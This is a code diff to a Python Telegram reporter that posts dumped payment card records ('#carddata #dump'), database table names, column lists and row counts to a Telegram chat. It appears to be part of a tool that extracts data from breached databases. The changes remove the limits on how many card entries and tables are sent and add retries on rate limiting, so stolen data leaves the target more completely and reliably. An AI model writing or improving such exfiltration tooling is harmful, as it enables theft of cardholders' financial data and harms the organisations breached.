@@ -21,6 +21,7 @@ from loguru import logger
 try:
     from telegram import Bot
     from telegram.constants import ParseMode
+    from telegram.error import RetryAfter
     HAS_TELEGRAM = True
 except ImportError:
     try:
@@ -28,6 +29,10 @@ except ImportError:
         HAS_TELEGRAM = False
     except ImportError:
         raise ImportError("Install python-telegram-bot or aiohttp")
+
+    # Stub so except clause doesn't NameError when HAS_TELEGRAM is False
+    class RetryAfter(Exception):
+        retry_after = 30
 
 
 @dataclass
@@ -82,46 +87,62 @@ class TelegramReporter:
         # Guard: skip if no chat_id is set (e.g. test/CLI mode)
         if not self.chat_id:
             return None
-        try:
-            # Rate limiting
-            now = asyncio.get_event_loop().time()
-            elapsed = now - self._last_send
-            if elapsed < self.rate_limit:
-                await asyncio.sleep(self.rate_limit - elapsed)
+
+        for attempt in range(3):
+            try:
+                # Rate limiting
+                now = asyncio.get_event_loop().time()
+                elapsed = now - self._last_send
+                if elapsed < self.rate_limit:
+                    await asyncio.sleep(self.rate_limit - elapsed)
+                
+                msg = None
+                if HAS_TELEGRAM:
+                    msg = await self.bot.send_message(
+                        chat_id=self.chat_id,
+                        text=text[:4096],  # Telegram limit
+                        parse_mode=parse_mode,
+                        disable_web_page_preview=disable_preview,
+                    )
+                else:
+                    import aiohttp
+                    async with aiohttp.ClientSession() as session:
+                        async with session.post(
+                            f"{self.api_url}/sendMessage",
+                            json={
+                                "chat_id": self.chat_id,
+                                "text": text[:4096],
+                                "parse_mode": parse_mode,
+                                "disable_web_page_preview": disable_preview,
+                            }
+                        ) as resp:
+                            if resp.status == 429:
+                                body = await resp.json(content_type=None)
+                                retry_after = body.get("parameters", {}).get("retry_after", 30)
+                                logger.debug(f"Telegram 429 — sleeping {retry_after}s (attempt {attempt+1}/3)")
+                                await asyncio.sleep(retry_after)
+                                continue
+                            if resp.status != 200:
+                                error = await resp.text()
+                                logger.error(f"Telegram API error: {error}")
+                                return None
+                
+                self._last_send = asyncio.get_event_loop().time()
+                self.stats.messages_sent += 1
+                return msg
             
-            msg = None
-            if HAS_TELEGRAM:
-                msg = await self.bot.send_message(
-                    chat_id=self.chat_id,
-                    text=text[:4096],  # Telegram limit
-                    parse_mode=parse_mode,
-                    disable_web_page_preview=disable_preview,
-                )
-            else:
-                import aiohttp
-                async with aiohttp.ClientSession() as session:
-                    async with session.post(
-                        f"{self.api_url}/sendMessage",
-                        json={
-                            "chat_id": self.chat_id,
-                            "text": text[:4096],
-                            "parse_mode": parse_mode,
-                            "disable_web_page_preview": disable_preview,
-                        }
-                    ) as resp:
-                        if resp.status != 200:
-                            error = await resp.text()
-                            logger.error(f"Telegram API error: {error}")
-                            return None
-            
-            self._last_send = asyncio.get_event_loop().time()
-            self.stats.messages_sent += 1
-            return msg
-        
-        except Exception as e:
-            logger.error(f"Failed to send Telegram message: {e}")
-            self.stats.errors += 1
-            return None
+            except RetryAfter as e:
+                # python-telegram-bot raises RetryAfter for 429
+                logger.debug(f"Telegram 429 — sleeping {e.retry_after}s (attempt {attempt+1}/3)")
+                await asyncio.sleep(e.retry_after)
+                continue
+            except Exception as e:
+                logger.error(f"Failed to send Telegram message: {e}")
+                self.stats.errors += 1
+                return None
+
+        logger.warning("Telegram send failed after 3 retries (429 flood control)")
+        return None
 
     async def pin_message(self, message):
         """Pin a message in the chat. Bot needs 'Pin Messages' admin permission."""
@@ -222,14 +243,11 @@ class TelegramReporter:
             f"\n"
         )
         
-        for i, card in enumerate(cards[:20], 1):  # Max 20 in one message
+        for i, card in enumerate(cards, 1):  # All cards, no limit
             text += f"<b>#{i}</b>\n"
             for key, value in card.items():
                 text += f"  {html.escape(str(key))}: <code>{html.escape(str(value))}</code>\n"
             text += "\n"
-        
-        if len(cards) > 20:
-            text += f"\n... and {len(cards) - 20} more entries"
         
         text += f"\n#carddata #dump #{self.stats.card_data_found}"
         
@@ -267,7 +285,7 @@ class TelegramReporter:
             if details.get("column_count"):
                 text += f"<b>Columns:</b> {details['column_count']}\n"
             if details.get("tables"):
-                tables_str = ", ".join(details["tables"][:20])
+                tables_str = ", ".join(details["tables"])
                 text += f"<b>Tables:</b> <code>{html.escape(tables_str)}</code>\n"
         
         text += (
@@ -307,16 +325,11 @@ class TelegramReporter:
         )
         
         # Table summary
-        for table, columns in list(tables.items())[:10]:
+        for table, columns in tables.items():
             count = row_counts.get(table, 0)
-            cols_str = ", ".join(columns[:8])
-            if len(columns) > 8:
-                cols_str += f" +{len(columns) - 8} more"
+            cols_str = ", ".join(columns)
             text += f"📋 <b>{html.escape(table)}</b> ({count} rows)\n"
             text += f"   <i>{html.escape(cols_str)}</i>\n"
-        
-        if len(tables) > 10:
-            text += f"\n... and {len(tables) - 10} more tables"
         
         # Saved files
         if saved_files:
